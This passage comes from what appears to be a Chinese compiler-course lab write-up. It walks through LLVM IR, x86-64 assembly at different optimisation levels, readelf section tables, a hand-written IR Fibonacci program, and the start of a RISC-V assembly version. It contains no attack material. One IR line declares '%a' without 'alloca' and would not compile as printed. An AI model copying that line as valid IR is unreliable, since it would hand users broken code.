&quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #2 = &#123; nofree nounwind &quot;frame-pointer&quot;=&quot;none&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line">attributes #3 = &#123; nounwind &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2, !3&#125;</span><br><span class="line">!llvm.ident = !&#123;!4&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 7, !&quot;PIC Level&quot;, i32 2&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;PIE Level&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!4 = !&#123;!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;&#125;</span><br><span class="line">!5 = !&#123;!6, !6, i64 0&#125;</span><br><span class="line">!6 = !&#123;!&quot;int&quot;, !7, i64 0&#125;</span><br><span class="line">!7 = !&#123;!&quot;omnipotent char&quot;, !8, i64 0&#125;</span><br><span class="line">!8 = !&#123;!&quot;Simple C/C++ TBAA&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="5汇编代码生成"><a href="#5汇编代码生成" class="headerlink" title="5汇编代码生成"></a>5<strong>汇编代码生成</strong></h3><h4 id="无优化-1"><a href="#无优化-1" class="headerlink" title="无优化"></a>无优化</h4><blockquote>
<p>非常正常的汇编代码，其中定义了每个section，其符合pic的规范，生成的目标文件需要经过got表的重定位（主要涉及到printf函数<code>callq	printf@PLT</code>）。</p>
<p>PLT会经过got表的重定位，来装载符号地址。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.file	&quot;ex.c&quot;</span><br><span class="line">	.globl	square                          # -- Begin function square</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	square,@function</span><br><span class="line">square:                                 # @square</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	.cfi_offset %rbp, -16</span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register %rbp</span><br><span class="line">	movl	%edi, -4(%rbp)</span><br><span class="line">	movl	-4(%rbp), %eax</span><br><span class="line">	imull	-4(%rbp), %eax</span><br><span class="line">	popq	%rbp</span><br><span class="line">	.cfi_def_cfa %rsp, 8</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end0:</span><br><span class="line">	.size	square, .Lfunc_end0-square</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.section	.rodata.cst8,&quot;aM&quot;,@progbits,8</span><br><span class="line">	.p2align	3                               # -- Begin function printResult</span><br><span class="line">.LCPI1_0:</span><br><span class="line">	.quad	0x400921fb54442d18              # double 3.1415926535897931</span><br><span class="line">	.text</span><br><span class="line">	.globl	printResult</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	printResult,@function</span><br><span class="line">printResult:                            # @printResult</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	.cfi_offset %rbp, -16</span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register %rbp</span><br><span class="line">	subq	$16, %rsp</span><br><span class="line">	movsd	%xmm0, -8(%rbp)</span><br><span class="line">	cvttsd2si	-8(%rbp), %edi</span><br><span class="line">	callq	square</span><br><span class="line">	cvtsi2sd	%eax, %xmm0</span><br><span class="line">	movsd	.LCPI1_0(%rip), %xmm1           # xmm1 = mem[0],zero</span><br><span class="line">	mulsd	%xmm0, %xmm1</span><br><span class="line">	movsd	%xmm1, -16(%rbp)</span><br><span class="line">	movsd	-8(%rbp), %xmm0                 # xmm0 = mem[0],zero</span><br><span class="line">	movsd	-16(%rbp), %xmm1                # xmm1 = mem[0],zero</span><br><span class="line">	movabsq	$.L.str, %rdi</span><br><span class="line">	movb	$2, %al</span><br><span class="line">	callq	printf@PLT</span><br><span class="line">	addq	$16, %rsp</span><br><span class="line">	popq	%rbp</span><br><span class="line">	.cfi_def_cfa %rsp, 8</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end1:</span><br><span class="line">	.size	printResult, .Lfunc_end1-printResult</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.section	.rodata.cst8,&quot;aM&quot;,@progbits,8</span><br><span class="line">	.p2align	3                               # -- Begin function main</span><br><span class="line">.LCPI2_0:</span><br><span class="line">	.quad	0x4014000000000000              # double 5</span><br><span class="line">	.text</span><br><span class="line">	.globl	main</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	main,@function</span><br><span class="line">main:                                   # @main</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	pushq	%rbp</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	.cfi_offset %rbp, -16</span><br><span class="line">	movq	%rsp, %rbp</span><br><span class="line">	.cfi_def_cfa_register %rbp</span><br><span class="line">	subq	$32, %rsp</span><br><span class="line">	movl	$0, -20(%rbp)</span><br><span class="line">	movsd	.LCPI2_0(%rip), %xmm0           # xmm0 = mem[0],zero</span><br><span class="line">	movsd	%xmm0, -16(%rbp)</span><br><span class="line">	movsd	-16(%rbp), %xmm0                # xmm0 = mem[0],zero</span><br><span class="line">	callq	printResult</span><br><span class="line">	movl	$0, -4(%rbp)</span><br><span class="line">.LBB2_1:                                # %for.cond</span><br><span class="line">                                        # =&gt;This Inner Loop Header: Depth=1</span><br><span class="line">	cmpl	$100, -4(%rbp)</span><br><span class="line">	jge	.LBB2_4</span><br><span class="line"># %bb.2:                                # %for.body</span><br><span class="line">                                        #   in Loop: Header=BB2_1 Depth=1</span><br><span class="line">	movl	-4(%rbp), %eax</span><br><span class="line">	addl	globalVar, %eax</span><br><span class="line">	movl	%eax, globalVar</span><br><span class="line"># %bb.3:                                # %for.inc</span><br><span class="line">                                        #   in Loop: Header=BB2_1 Depth=1</span><br><span class="line">	movl	-4(%rbp), %eax</span><br><span class="line">	addl	$1, %eax</span><br><span class="line">	movl	%eax, -4(%rbp)</span><br><span class="line">	jmp	.LBB2_1</span><br><span class="line">.LBB2_4:                                # %for.end</span><br><span class="line">	movl	globalVar, %esi</span><br><span class="line">	movabsq	$.L.str.1, %rdi</span><br><span class="line">	movb	$0, %al</span><br><span class="line">	callq	printf@PLT</span><br><span class="line">	xorl	%eax, %eax</span><br><span class="line">	addq	$32, %rsp</span><br><span class="line">	popq	%rbp</span><br><span class="line">	.cfi_def_cfa %rsp, 8</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end2:</span><br><span class="line">	.size	main, .Lfunc_end2-main</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.type	maxValue,@object                # @maxValue</span><br><span class="line">	.section	.rodata,&quot;a&quot;,@progbits</span><br><span class="line">	.globl	maxValue</span><br><span class="line">	.p2align	2</span><br><span class="line">maxValue:</span><br><span class="line">	.long	100                             # 0x64</span><br><span class="line">	.size	maxValue, 4</span><br><span class="line"></span><br><span class="line">	.type	globalVar,@object               # @globalVar</span><br><span class="line">	.data</span><br><span class="line">	.globl	globalVar</span><br><span class="line">	.p2align	2</span><br><span class="line">globalVar:</span><br><span class="line">	.long	10                              # 0xa</span><br><span class="line">	.size	globalVar, 4</span><br><span class="line"></span><br><span class="line">	.type	.L.str,@object                  # @.str</span><br><span class="line">	.section	.rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class="line">.L.str:</span><br><span class="line">	.asciz	&quot;Area of the circle with radius %.2f is %.2f\n&quot;</span><br><span class="line">	.size	.L.str, 45</span><br><span class="line"></span><br><span class="line">	.type	.L.str.1,@object                # @.str.1</span><br><span class="line">.L.str.1:</span><br><span class="line">	.asciz	&quot;Final globalVar value: %d\n&quot;</span><br><span class="line">	.size	.L.str.1, 27</span><br><span class="line"></span><br><span class="line">	.ident	&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;</span><br><span class="line">	.section	&quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="O2优化-1"><a href="#O2优化-1" class="headerlink" title="O2优化"></a>O2优化</h4><blockquote>
<p>O1和O2的ir是差不多的，因此这里只显示了其中之一</p>
<p>其中的.标号则是为了pic定位设置的，访问全局变量，访问标号偏移的行对地址，再在相应的地方（got表）进行重定位。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.text</span><br><span class="line">	.file	&quot;ex.c&quot;</span><br><span class="line">	.globl	square                          # -- Begin function square</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	square,@function</span><br><span class="line">square:                                 # @square</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	movl	%edi, %eax</span><br><span class="line">	imull	%edi, %eax</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end0:</span><br><span class="line">	.size	square, .Lfunc_end0-square</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.section	.rodata.cst8,&quot;aM&quot;,@progbits,8</span><br><span class="line">	.p2align	3                               # -- Begin function printResult</span><br><span class="line">.LCPI1_0:</span><br><span class="line">	.quad	0x400921fb54442d18              # double 3.1415926535897931</span><br><span class="line">	.text</span><br><span class="line">	.globl	printResult</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	printResult,@function</span><br><span class="line">printResult:                            # @printResult</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	pushq	%rax</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	cvttsd2si	%xmm0, %eax</span><br><span class="line">	imull	%eax, %eax</span><br><span class="line">	cvtsi2sd	%eax, %xmm1</span><br><span class="line">	mulsd	.LCPI1_0(%rip), %xmm1</span><br><span class="line">	movl	$.L.str, %edi</span><br><span class="line">	movb	$2, %al</span><br><span class="line">	callq	printf@PLT</span><br><span class="line">	popq	%rax</span><br><span class="line">	.cfi_def_cfa_offset 8</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end1:</span><br><span class="line">	.size	printResult, .Lfunc_end1-printResult</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.section	.rodata.cst8,&quot;aM&quot;,@progbits,8</span><br><span class="line">	.p2align	3                               # -- Begin function main</span><br><span class="line">.LCPI2_0:</span><br><span class="line">	.quad	0x4014000000000000              # double 5</span><br><span class="line">.LCPI2_1:</span><br><span class="line">	.quad	0x4053a28c59d5433b              # double 78.539816339744831</span><br><span class="line">	.text</span><br><span class="line">	.globl	main</span><br><span class="line">	.p2align	4, 0x90</span><br><span class="line">	.type	main,@function</span><br><span class="line">main:                                   # @main</span><br><span class="line">	.cfi_startproc</span><br><span class="line"># %bb.0:                                # %entry</span><br><span class="line">	pushq	%rax</span><br><span class="line">	.cfi_def_cfa_offset 16</span><br><span class="line">	movsd	.LCPI2_0(%rip), %xmm0           # xmm0 = mem[0],zero</span><br><span class="line">	movsd	.LCPI2_1(%rip), %xmm1           # xmm1 = mem[0],zero</span><br><span class="line">	movl	$.L.str, %edi</span><br><span class="line">	movb	$2, %al</span><br><span class="line">	callq	printf@PLT</span><br><span class="line">	movl	$4950, %esi                     # imm = 0x1356</span><br><span class="line">	addl	globalVar(%rip), %esi</span><br><span class="line">	movl	%esi, globalVar(%rip)</span><br><span class="line">	movl	$.L.str.1, %edi</span><br><span class="line">	xorl	%eax, %eax</span><br><span class="line">	callq	printf@PLT</span><br><span class="line">	xorl	%eax, %eax</span><br><span class="line">	popq	%rcx</span><br><span class="line">	.cfi_def_cfa_offset 8</span><br><span class="line">	retq</span><br><span class="line">.Lfunc_end2:</span><br><span class="line">	.size	main, .Lfunc_end2-main</span><br><span class="line">	.cfi_endproc</span><br><span class="line">                                        # -- End function</span><br><span class="line">	.type	maxValue,@object                # @maxValue</span><br><span class="line">	.section	.rodata,&quot;a&quot;,@progbits</span><br><span class="line">	.globl	maxValue</span><br><span class="line">	.p2align	2</span><br><span class="line">maxValue:</span><br><span class="line">	.long	100                             # 0x64</span><br><span class="line">	.size	maxValue, 4</span><br><span class="line"></span><br><span class="line">	.type	globalVar,@object               # @globalVar</span><br><span class="line">	.data</span><br><span class="line">	.globl	globalVar</span><br><span class="line">	.p2align	2</span><br><span class="line">globalVar:</span><br><span class="line">	.long	10                              # 0xa</span><br><span class="line">	.size	globalVar, 4</span><br><span class="line"></span><br><span class="line">	.type	.L.str,@object                  # @.str</span><br><span class="line">	.section	.rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class="line">.L.str:</span><br><span class="line">	.asciz	&quot;Area of the circle with radius %.2f is %.2f\n&quot;</span><br><span class="line">	.size	.L.str, 45</span><br><span class="line"></span><br><span class="line">	.type	.L.str.1,@object                # @.str.1</span><br><span class="line">.L.str.1:</span><br><span class="line">	.asciz	&quot;Final globalVar value: %d\n&quot;</span><br><span class="line">	.size	.L.str.1, 27</span><br><span class="line"></span><br><span class="line">	.ident	&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;</span><br><span class="line">	.section	&quot;.note.GNU-stack&quot;,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-可执行文件生成"><a href="#6-可执行文件生成" class="headerlink" title="6 可执行文件生成"></a>6 可执行文件生成</h3><blockquote>
<p>这里细分可以分为两个步骤，一个是可重定位文件的生成，然后是可执行文件的生成，后者则需要链接器的参与。</p>
<p>前者只是扫描本汇编文件，生成符号表，但是外部符号，也就是定义在其他模块的符号，编译器并不认识，因此需要链接操作。</p>
<p>而链接又分为动态链接，以及静态链接，所谓pic就是相对于动态链接而言的（一个库代码copy处处运行，但是每个程序的虚拟地址映射都是不同的，因此需要运行时装载，应该是一个dlresolve来完成，记不清了），静态链接会一股脑的把目标文件和库文件有用的没用的放到一起，但是动态链接则是用哪个拿那个，因此需要重定位，运行时解析（plt的懒加载），但是一般都是在程序开始时加载got表。（这块很复杂，也不是一两句说的清的）。以下可以看出重定位文件和可执行文件的关系，静态链接没什么可说的，就拿动态链接举例了。</p>
</blockquote>
<blockquote>
<p>可以观察section表，注意和可执行文件的差异，可以看出可执行文件多了plt和got表</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -c ex.S -o  ex.o</span><br><span class="line">root@L:/home/l/homework/compiler/lab1# readelf -S ex.o</span><br><span class="line">There are 15 section headers, starting at offset 0x558:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       00000000000000cf  0000000000000000  AX       0     0     16</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  00000388</span><br><span class="line">       0000000000000108  0000000000000018   I      12     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  00000110</span><br><span class="line">       0000000000000004  0000000000000000  WA       0     0     4</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  00000114</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 5] .rodata.cst8      PROGBITS         0000000000000000  00000118</span><br><span class="line">       0000000000000010  0000000000000008  AM       0     0     8</span><br><span class="line">  [ 6] .rodata           PROGBITS         0000000000000000  00000128</span><br><span class="line">       0000000000000004  0000000000000000   A       0     0     4</span><br><span class="line">  [ 7] .rodata.str1.1    PROGBITS         0000000000000000  0000012c</span><br><span class="line">       0000000000000048  0000000000000001 AMS       0     0     1</span><br><span class="line">  [ 8] .comment          PROGBITS         0000000000000000  00000174</span><br><span class="line">       0000000000000028  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 9] .note.GNU-stack   PROGBITS         0000000000000000  0000019c</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [10] .eh_frame         PROGBITS         0000000000000000  000001a0</span><br><span class="line">       0000000000000078  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .rela.eh_frame    RELA             0000000000000000  00000490</span><br><span class="line">       0000000000000048  0000000000000018   I      12    10     8</span><br><span class="line">  [12] .symtab           SYMTAB           0000000000000000  00000218</span><br><span class="line">       0000000000000120  0000000000000018          13     6     8</span><br><span class="line">  [13] .strtab           STRTAB           0000000000000000  00000338</span><br><span class="line">       000000000000004a  0000000000000000           0     0     1</span><br><span class="line">  [14] .shstrtab         STRTAB           0000000000000000  000004d8</span><br><span class="line">       000000000000007d  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">ld -PIE ex.o /usr/lib/x86_64-linux-gnu/crt1.o /usr/lib/x86_64-linux-gnu/crti.o /usr/lib/x86_64-linux-gnu/crtn.o -lc -o ex</span><br><span class="line">root@L:/home/l/homework/compiler/lab1# readelf -S ex</span><br><span class="line">There are 26 section headers, starting at offset 0x3478:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         00000000004002e0  000002e0</span><br><span class="line">       000000000000000f  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.pr[...] NOTE             00000000004002f0  000002f0</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.ABI-tag     NOTE             0000000000400310  00000310</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .<span class="built_in">hash</span>             HASH             0000000000400330  00000330</span><br><span class="line">       0000000000000024  0000000000000004   A       6     0     8</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         0000000000400358  00000358</span><br><span class="line">       000000000000001c  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           0000000000400378  00000378</span><br><span class="line">       0000000000000060  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           00000000004003d8  000003d8</span><br><span class="line">       000000000000004d  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           0000000000400426  00000426</span><br><span class="line">       0000000000000008  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000400430  00000430</span><br><span class="line">       0000000000000030  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000400460  00000460</span><br><span class="line">       0000000000000030  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000400490  00000490</span><br><span class="line">       0000000000000018  0000000000000018  AI       6    20     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000401000  00001000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000401020  00001020</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .text             PROGBITS         0000000000401040  00001040</span><br><span class="line">       0000000000000105  0000000000000000  AX       0     0     16</span><br><span class="line">  [15] .fini             PROGBITS         0000000000401148  00001148</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [16] .rodata           PROGBITS         0000000000402000  00002000</span><br><span class="line">       0000000000000060  0000000000000000   A       0     0     8</span><br><span class="line">  [17] .eh_frame         PROGBITS         0000000000402060  00002060</span><br><span class="line">       00000000000000c8  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .dynamic          DYNAMIC          0000000000403e40  00002e40</span><br><span class="line">       00000000000001b0  0000000000000010  WA       7     0     8</span><br><span class="line">  [19] .got              PROGBITS         0000000000403ff0  00002ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .got.plt          PROGBITS         0000000000404000  00003000</span><br><span class="line">       0000000000000020  0000000000000008  WA       0     0     8</span><br><span class="line">  [21] .data             PROGBITS         0000000000404020  00003020</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     4</span><br><span class="line">  [22] .comment          PROGBITS         0000000000000000  00003028</span><br><span class="line">       0000000000000027  0000000000000001  MS       0     0     1</span><br><span class="line">  [23] .symtab           SYMTAB           0000000000000000  00003050</span><br><span class="line">       0000000000000258  0000000000000018          24     7     8</span><br><span class="line">  [24] .strtab           STRTAB           0000000000000000  000032a8</span><br><span class="line">       00000000000000f8  0000000000000000           0     0     1</span><br><span class="line">  [25] .shstrtab         STRTAB           0000000000000000  000033a0</span><br><span class="line">       00000000000000d8  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="二-IR编程"><a href="#二-IR编程" class="headerlink" title="二 IR编程"></a>二 IR编程</h2><blockquote>
<p>示例程序</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main() &#123;</span><br><span class="line">    // 定义变量</span><br><span class="line">    int a, b, i, t, n;</span><br><span class="line"></span><br><span class="line">    // 初始化变量</span><br><span class="line">    a = 0;  // 斐波那契数列的第一个数</span><br><span class="line">    b = 1;  // 斐波那契数列的第二个数</span><br><span class="line">    i = 1;  // 计数器</span><br><span class="line"></span><br><span class="line">    // 输入要生成的斐波那契数列长度</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    // 输出斐波那契数列的前两个数字</span><br><span class="line">    cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    // 生成斐波那契数列</span><br><span class="line">    while (i &lt; n) &#123;</span><br><span class="line">        t = b;       // 保存当前的 b 值</span><br><span class="line">        b = a + b;   // b 变成下一个斐波那契数</span><br><span class="line">        cout &lt;&lt; b &lt;&lt; endl;  // 输出当前的 b 值</span><br><span class="line">        a = t;       // 更新 a 为上一个的 b 值</span><br><span class="line">        i = i + 1;   // 计数器加 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>相应ir代码</p>
<p>SH:</p>
<p>llc -relocation-model&#x3D;pic 2.ll -o main.S</p>
<p>gcc main.S -o two</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 模块ID = &#x27;fib.ll&#x27;</span><br><span class="line">; 声明外部函数</span><br><span class="line">declare i32 @scanf(i8*, ...)</span><br><span class="line">declare i32 @printf(i8*, ...)</span><br><span class="line"></span><br><span class="line">; 定义格式化字符串</span><br><span class="line">@.str_in = private unnamed_addr constant [3 x i8] c&quot;%d\00&quot;, align 1    ; 用于输入整数</span><br><span class="line">@.str_out = private unnamed_addr constant [4 x i8] c&quot;%d\0A\00&quot;, align 1 ; 用于输出整数并换行</span><br><span class="line"></span><br><span class="line">; 主函数</span><br><span class="line">define i32 @main() &#123;</span><br><span class="line">entry:</span><br><span class="line">    ; 分配变量的栈空间</span><br><span class="line">    %a = </span><br><span class="line">    i32, align 4    ; int a;</span><br><span class="line">    %b = alloca i32, align 4    ; int b;</span><br><span class="line">    %i = alloca i32, align 4    ; int i;</span><br><span class="line">    %t = alloca i32, align 4    ; int t;</span><br><span class="line">    %n = alloca i32, align 4    ; int n;</span><br><span class="line"></span><br><span class="line">    ; 初始化变量</span><br><span class="line">    store i32 0, i32* %a, align 4    ; a = 0;</span><br><span class="line">    store i32 1, i32* %b, align 4    ; b = 1;</span><br><span class="line">    store i32 1, i32* %i, align 4    ; i = 1;</span><br><span class="line"></span><br><span class="line">    ; 输入要生成的斐波那契数列长度 n</span><br><span class="line">    call i32 (i8*, ...) @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str_in, i32 0, i32 0), i32* %n)</span><br><span class="line"></span><br><span class="line">    ; 输出斐波那契数列的前两个数字</span><br><span class="line">    %a_val = load i32, i32* %a, align 4</span><br><span class="line">    call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str_out, i32 0, i32 0), i32 %a_val)</span><br><span class="line">    %b_val = load i32, i32* %b, align 4</span><br><span class="line">    call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str_out, i32 0, i32 0), i32 %b_val)</span><br><span class="line"></span><br><span class="line">    ; 进入循环</span><br><span class="line">    br label %loop</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">    ; 加载当前的 i 和 n 的值</span><br><span class="line">    %i_val = load i32, i32* %i, align 4</span><br><span class="line">    %n_val = load i32, i32* %n, align 4</span><br><span class="line">    ; 判断 i 是否小于 n</span><br><span class="line">    %cmp = icmp slt i32 %i_val, %n_val</span><br><span class="line">    ; 根据比较结果跳转</span><br><span class="line">    br i1 %cmp, label %loop_body, label %end</span><br><span class="line"></span><br><span class="line">loop_body:</span><br><span class="line">    ; t = b;</span><br><span class="line">    %b_val2 = load i32, i32* %b, align 4</span><br><span class="line">    store i32 %b_val2, i32* %t, align 4</span><br><span class="line">    ; b = a + b;</span><br><span class="line">    %a_val2 = load i32, i32* %a, align 4</span><br><span class="line">    %sum = add i32 %a_val2, %b_val2</span><br><span class="line">    store i32 %sum, i32* %b, align 4</span><br><span class="line">    ; 输出当前的 b 值</span><br><span class="line">    %b_val3 = load i32, i32* %b, align 4</span><br><span class="line">    call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str_out, i32 0, i32 0), i32 %b_val3)</span><br><span class="line">    ; a = t;</span><br><span class="line">    %t_val = load i32, i32* %t, align 4</span><br><span class="line">    store i32 %t_val, i32* %a, align 4</span><br><span class="line">    ; i = i + 1;</span><br><span class="line">    %i_val2 = load i32, i32* %i, align 4</span><br><span class="line">    %inc = add i32 %i_val2, 1</span><br><span class="line">    store i32 %inc, i32* %i, align 4</span><br><span class="line">    ; 返回循环判断</span><br><span class="line">    br label %loop</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">    ; 函数返回</span><br><span class="line">    ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>输出示例：</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240917191630045.png" alt="image-20240917191630045"></p>
<h2 id="三-汇编编程"><a href="#三-汇编编程" class="headerlink" title="三 汇编编程"></a>三 汇编编程</h2><blockquote>
<p>SH:</p>
<p>riscv64-unknown-linux-gnu-gcc -o three three.S -static</p>
<p>qemu-riscv64 .&#x2F;three</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    .data</span><br><span class="line"># scanf 和 printf 的格式字符串</span><br><span class="line">input_fmt:    .asciz &quot;%d&quot;       # 读取整数的格式字符串</span><br><span class="line">output_fmt:   .asciz &quot;%d\n&quot;     # 输出带换行符的整数的格式字符串</span><br><span class="line"></span><br><span class="line">    .text</span><br><span class="line">    .global main</span><br><span class="line">main:</span><br><span class="line">    # 设置栈帧</span><br><span class="line">    addi sp, sp, -32           # 分配 32 字节的栈空间用于变量和保存的寄存器</span><br><span class="line">    sw ra, 28(sp)              # 保存返回地址</span><br><span class="line">    sw s0, 24(sp)              # 保存帧指针</span><br><span class="line">    addi s0, sp, 32            # 设置帧指针 (s0) 为栈帧的顶部</span><br><span class="line"></span><br><span class="line">    # 为变量 a, b, i, t, n 分配空间</span><br><span class="line">    # 通过从 s0 的偏移量访问变量：</span><br><span class="line">    # a: -20(s0)</span><br><span class="line">    # b: -16(s0)</span><br><span class="line">    # i: -12(s0)</span><br><span class="line">    # t: -8(s0)</span><br><span class="line">    # n: -4(s0)</span><br><span class="line"></span><br><span class="line">    # 初始化变量</span><br><span class="line">    li t0, 0                   # 将立即数 0 加载到 t0 中</span><br><span class="line">    sw t0, -20(s0)             # 将 t0 存储到 a 中 (a = 0)</span><br><span class="line">    li t0, 1                   # 将立即数 